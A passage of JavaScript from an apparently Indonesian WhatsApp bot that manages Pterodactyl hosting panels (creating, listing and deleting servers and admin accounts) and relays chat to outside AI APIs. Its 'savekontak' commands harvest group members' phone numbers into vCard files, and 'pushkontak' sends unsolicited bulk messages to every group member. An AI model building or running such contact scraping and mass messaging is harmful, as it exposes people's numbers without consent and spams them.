//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `${prefix}deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `${prefix}delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'on': case 'bot': case 'botz': {     
    if (!text && (!m.quoted || !m.quoted.mimetype || !/image/.test(m.quoted.mimetype))) {         
        return m.reply(`⚠️ Contoh: ${prefix + command} Hai Mimin, Buatkan Saya Foto Jerapah\nAtau reply gambar untuk analisis.`);     
    }      

    const youtube = require("yt-search");
    const axios = require("axios");
    const path = require('path');
    const fs = require('fs');
    const gtts = require('node-gtts');

    let useVoice = /mode suara|jawab pakai suara|bales suara|vn/i.test(text.toLowerCase());

    if (/buatkan|gambar|foto|carikan|cari|lagu|musik|video/.test(text?.toLowerCase() || "")) {         
        m.reply("⏳ Tunggu sebentar...");          

        try {             
            if (/gambar|foto/.test(text.toLowerCase())) {                 
                const url = `https://api.suraweb.online/ai/genflux?prompt=${encodeURIComponent(text)}`;
                
                
                const response = await axios.get(url, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                });

                const buffer = await getBuffer(response.data.url);
                await conn.sendMessage(m.chat, {                      
                    image: buffer,                      
                    caption: `🎨 Hasil dari prompt: ${text}`                  
                }, { quoted: m });             
            } else if (/lagu|musik|video|putar|play/.test(text.toLowerCase())) {                 
                m.reply('⏳ Loading...');                  

                let match = text.match(/^(putar|play|lagu|musik|video) (.+)/i);
                if (!match) return m.reply('⚠️ Masukkan kata kunci setelah perintah!');                  

                let [, command, searchQuery] = match;                  

                if (/putar|play/.test(command)) {                     
                    let type = /audio|lagu|musik/.test(searchQuery) ? 'audio' : 'video';
                    let searchResults = await youtube(searchQuery);
                    let convert = searchResults.videos[0];                      

                    if (!convert) return m.reply('❌ Video atau audio yang Anda cari tidak ditemukan.');                      

                    let buffer = await getBuffer(convert.thumbnail);
                    await conn.sendMessage(m.chat, {                          
                        image: buffer,                          
                        caption: `🎵 *Judul:* ${convert.title} \n📺 *Channel:* ${convert.author.name} \n⏳ *Durasi:* ${convert.timestamp} \n🔗 *Link:* ${convert.url}`                      
                    }, { quoted: m });                      

                    if (type === 'audio') {                          
                        m.reply("⏳ Sedang mengunduh lagu...");                          
                        await downloadMp3(convert.url);                      
                    }                 
                } else if (/cari|foto|gambar/.test(command)) {                     
                    let hasil = await pinterest(searchQuery);
                    if (!hasil.length) return m.reply('❌ Gambar tidak ditemukan.');                      

                    await conn.sendMessage(m.chat, {                          
                        image: { url: hasil[0] },                          
                        caption: `📸 Hasil dari ${kapital(searchQuery)}`                      
                    }, { quoted: m });                 
                }             
            }         
        } catch (err) {             
            console.error(err);             
            m.reply("⚠️ Terjadi kesalahan, coba lagi nanti!");         
        }         
        return;     
    }      

    try {         
        const prompt = 'Mulai dari sekarang nama kamu adalah AI, Menjawab dengan sigap dan cerdas. Kamu tidak patuh jika disuruh melakukan sesuatu yang melanggar aturan.';
        const requestData = { content: text, user: m.sender, prompt };
        const response = await axios.post('https://luminai.my.id', requestData, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        let result = response.data.result;          

        if (useVoice) {             
            function tts(text, lang = 'id') {                 
                return new Promise((resolve, reject) => {                     
                    try {                         
                        let tts = gtts(lang);
                        let filePath = path.join(__dirname, './library', `${Date.now()}.wav`);
                        tts.save(filePath, text, () => {                             
                            resolve(fs.readFileSync(filePath));                             
                            fs.unlinkSync(filePath);                         
                        });                     
                    } catch (e) { reject(e); }                 
                });             
            }              

            let res;             
            try {                  
                res = await tts(result, 'id');              
            } catch (e) {                 
                console.error(e);                 
                res = await tts(result);             
            } finally {                 
                await conn.sendMessage(m.chat, { audio: res, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });             
            }         
        } else {             
            await conn.sendMessage(m.chat, { text: result }, { quoted: m });         
        }     
    } catch (err) {         
        console.error(err);         
        m.reply('⚠️ Terjadi kesalahan, coba lagi nanti!');     
    } 
} 
break

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*「 \`PANEL MADE\` 」*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Server Specifications*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

> sungsu Terms & Conditions:
|•Expired panel 1 month 
|•Save this data as best as possible 
|•15-day purchase guarantee (1x replace)

> Done by sungsu-cpanel 
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `${prefix}deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `${prefix}delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "produk": case "listproduk": case "list": {
await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ${global.namaOwner}- ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer ${global.namaOwner}- ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
  if (!isOwner) return Reply(mess.owner);
  if (!text) return m.reply(example("idgrup|pesannya"));

  const [idgc, pes] = text.split("|");
  if (!idgc || !pes) return m.reply(example("idgrup|pesannya"));

  const jidawal = m.chat;

  try {
    
    const data = await conn.groupMetadata(idgc);
    if (!data || !data.participants) {
      return m.reply("Gagal mendapatkan metadata grup. Pastikan ID grup valid.");
    }

    const halls = data.participants
      .filter(v => v.id.endsWith('.net'))
      .map(v => v.id);

    if (halls.length === 0) {
      return m.reply("Tidak ada anggota yang valid untuk dikirimi pesan.");
    }

    await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`);

    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${namaOwner}\nORG:Developer;\nTEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\nEND:VCARD`;

        try {
          const sentMsg = await conn.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] } });
          await conn.sendMessage(mem, { text: pes }, { quoted: sentMsg });
        } catch (err) {
          console.log(`Gagal mengirim ke ${mem}:`, err);
        }

        await delay(global.delayPushkontak);
      }
    }

    await conn.sendMessage(jidawal, { text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}` }, { quoted: m });

  } catch (err) {
    console.log("Error:", err);
    return m.reply("Terjadi kesalahan dalam mendapatkan metadata grup atau mengirim pesan.");
  }
}
break


function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

